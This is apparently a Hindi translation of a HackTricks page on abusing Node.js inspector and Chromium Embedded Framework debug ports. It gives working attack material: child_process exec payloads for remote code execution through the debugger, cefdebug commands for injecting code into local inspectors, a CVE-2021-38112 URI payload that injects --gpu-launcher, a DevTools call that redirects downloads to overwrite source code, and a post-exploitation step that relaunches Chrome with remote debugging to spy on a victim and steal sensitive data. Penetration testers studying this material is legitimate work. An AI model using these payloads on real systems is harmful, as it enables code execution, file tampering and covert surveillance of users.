# नोड इंस्पेक्टर/CEF डीबग दुरुपयोग

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा पीआर जमा करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

## मूलभूत जानकारी

जब `--inspect` स्विच के साथ शुरू किया जाता है, तो एक नोड.जेएस प्रक्रिया एक डीबगिंग क्लाइंट के लिए सुनती है। **डिफ़ॉल्ट** रूप में, यह होस्ट और पोर्ट **`127.0.0.1:9229`** पर सुनेगा। प्रत्येक प्रक्रिया को एक **अद्वितीय** **UUID** भी सौंपा जाता है।

इंस्पेक्टर क्लाइंट्स को होस्ट पता, पोर्ट, और UUID को जानना और निर्दिष्ट करना चाहिए ताकि वे कनेक्ट कर सकें। पूर्ण URL कुछ इस तरह दिखेगा `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।

{% hint style="warning" %}
क्योंकि **डीबगर को नोड.जेएस के निष्पादन पर्यावरण का पूरा उपयोग होता है**, इस पोर्ट से कनेक्ट होने के लिए सक्षम एक दुर्भाग्यपूर्ण कारक व्यक्ति को नोड.जेएस प्रक्रिया के नामांकित कोड को निष्पादित करने की क्षमता हो सकती है (**संभावित विशेषाधिकार उन्नयन**)
{% endhint %}

इंस्पेक्टर शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप एक निरीक्षित प्रक्रिया शुरू करते हैं, तो कुछ इस तरह का दिखेगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
च्रोमियम एम्बेडेड फ्रेमवर्क (CEF) पर आधारित प्रक्रियाएं उपयोग करने के लिए `--remote-debugging-port=9222` जैसे पैरामीटर का उपयोग करना चाहिए ताकि **डीबगर** (SSRF संरक्षण बहुत ही समान रहती है) खोल सकें। हालांकि, इसके बजाय नोडजेएस डीबग सत्र की प्रदान करने की बजाय, वे ब्राउज़र के साथ [क्रोम डेवटूल्स प्रोटोकॉल](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके संचार करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन सीधा RCE नहीं है।

जब आप एक डीबग किए गए ब्राउज़र को शुरू करते हैं, तो कुछ इस तरह का दिखेगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ब्राउज़र, वेबसॉकेट और समान मूल नीति <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेब-ब्राउज़र में खुली वेबसाइटें ब्राउज़र सुरक्षा मॉडल के तहत वेबसॉकेट और HTTP अनुरोध कर सकती हैं। **एक प्रारंभिक HTTP कनेक्शन** को **एक अद्वितीय डीबगर सत्र आईडी प्राप्त करने** के लिए आवश्यक होता है। **समान मूल नीति** वेबसाइटों को इस HTTP कनेक्शन को बनाने से रोकती है। [**DNS रिबाइंडिंग हमलों**](https://en.wikipedia.org/wiki/DNS\_rebinding) के खिलाफ अतिरिक्त सुरक्षा के लिए, Node.js सत्यापित करता है कि कनेक्शन के लिए **'Host' हैडर** या तो **एक आईपी ​​पता** या सटीक रूप से **`localhost`** या **`localhost6`** निर्दिष्ट करता है।

{% hint style="info" %}
यह **सुरक्षा उपाय निर्दिष्ट करता है कि इंस्पेक्टर का शोधार्थी उपयोग** करके कोड चलाने के लिए **केवल एक HTTP अनुरोध भेजकर** (जो एक SSRF दुरुपयोग करके किया जा सकता है) नहीं किया जा सकता है।
{% endhint %}

### चल रहे प्रक्रियाओं में इंस्पेक्टर शुरू करना

आप एक चल रहे नोडजेएस प्रक्रिया को **सिग्नल SIGUSR1** भेज सकते हैं ताकि इसे **डिफ़ॉल्ट पोर्ट में इंस्पेक्टर शुरू** करें। हालांकि, ध्यान दें कि आपको पर्याप्त विशेषाधिकार होने चाहिए, इसलिए यह आपको **प्रक्रिया के भीतर जानकारी के लिए विशेषाधिकार पहुंच** दे सकता है लेकिन सीधी विशेषाधिकार उन्नयन नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
यह कंटेनर में उपयोगी है क्योंकि **प्रक्रिया को बंद करके एक नई प्रक्रिया शुरू करना** `--inspect` के साथ एक विकल्प नहीं है क्योंकि **कंटेनर** प्रक्रिया के साथ **मर जाएगा**।
{% endhint %}

### इंस्पेक्टर/डीबगर से कनेक्ट करें

यदि आपके पास एक **Chromium आधारित ब्राउज़र** तक पहुंच है, तो आप `chrome://inspect` या `edge://inspect` में जाकर कनेक्ट कर सकते हैं। कॉन्फ़िगर बटन पर क्लिक करें और सुनिश्चित करें कि आपका **लक्षित होस्ट और पोर्ट** सूचीबद्ध हैं (इसका एक उदाहरण निम्नलिखित चित्र में दिया गया है, जहां एक अगले खंड के उदाहरण का उपयोग करके RCE कैसे प्राप्त करें का पता चलेगा)।

![](<../../.gitbook/assets/image (620) (1).png>)

**कमांड लाइन** का उपयोग करके आप एक डीबगर/इंस्पेक्टर से कनेक्ट कर सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
यह टूल [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **इंस्पेक्टर्स को खोजने** और उनमें **कोड इंजेक्शन** करने की अनुमति देता है।
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
ध्यान दें कि यदि आप [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से कनेक्ट हैं, तो **NodeJS RCE उत्पन्न नहीं होगी** (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जांच करनी होगी)।
{% endhint %}

## NodeJS Debugger/Inspector में RCE

{% hint style="info" %}
यदि आप इलेक्ट्रॉन में XSS से [**RCE प्राप्त करने के बारे में जानने के लिए यह पृष्ठ देखने आए हैं तो कृपया इस पृष्ठ की जांच करें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

जब आप एक नोड **इंस्पेक्टर** से **कनेक्ट** कर सकते हैं, तो कुछ सामान्य तरीके हैं जिनका उपयोग करके आप **RCE** प्राप्त कर सकते हैं (ऐसा लगता है कि यह **Chrome DevTools protocol कनेक्शन में काम नहीं करेगा**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

आप यहाँ API की जांच कर सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
इस खंड में मैं केवल वह दिलचस्प चीजें सूचीबद्ध करूंगा जिन्हें लोगों ने इस प्रोटोकॉल का उपयोग करके शोषण करने के लिए उपयोग किया है।

### गहरे लिंक के माध्यम से पैरामीटर इंजेक्शन

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने खोजा कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में एक कस्टम URI (workspaces://) रजिस्टर किया था जो पूरी URI प्राप्त करता था और फिर उस URI से आंशिक रूप से निर्मित कॉन्फ़िगरेशन के साथ CEF पर आधारित एप्लिकेशन को चालू करता था।

यह पाया गया कि URI पैरामीटर URL डीकोड किए जाते हैं और CEF बेसिक एप्लिकेशन को चालू करने के लिए उपयोग किए जाते हैं, जिससे उपयोगकर्ता को फ़्लैग **`--gpu-launcher`** को **कमांड लाइन** में इंजेक्ट करने और विभिन्न चीजें चलाने की अनुमति मिलती है।

इसलिए, एक पेलोड जैसे:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
कैल्क.exe को निष्पादित करेंगे।

### फ़ाइलों को अधिलेखित करें

**डाउनलोड की गई फ़ाइलें को बचाने वाले** फ़ोल्डर को बदलें और एक फ़ाइल डाउनलोड करें जिससे आप अपने **हानिकारक कोड** के साथ एप्लिकेशन के अक्सर इस्तेमाल किए जाने वाले **स्रोत कोड** को **अधिलेखित** कर सकें।
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE और बाहरी निकासी

इस पोस्ट के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) थेरिवर से RCE प्राप्त करना और आंतरिक पृष्ठों को बाहरी निकासी करना संभव है।

### पोस्ट-एक्सप्लोइटेशन

एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को संक्रमित करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप Chrome प्रक्रिया को **डीबगिंग सक्षम करके चला सकते हैं और डीबगिंग पोर्ट को पोर्ट-फ़ोरवर्ड कर सकते हैं**, ताकि आप इसे एक्सेस कर सकें। इस तरीके से आप विक्टिम द्वारा Chrome के साथ किये जाने वाले सभी कार्यों की जांच कर सकेंगे और संवेदनशील जानकारी चुरा सकेंगे।

छलील तरीका है **हर Chrome प्रक्रिया को समाप्त करना** और फिर कुछ इस तरह से कॉल करना
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## संदर्भ

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह,
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>
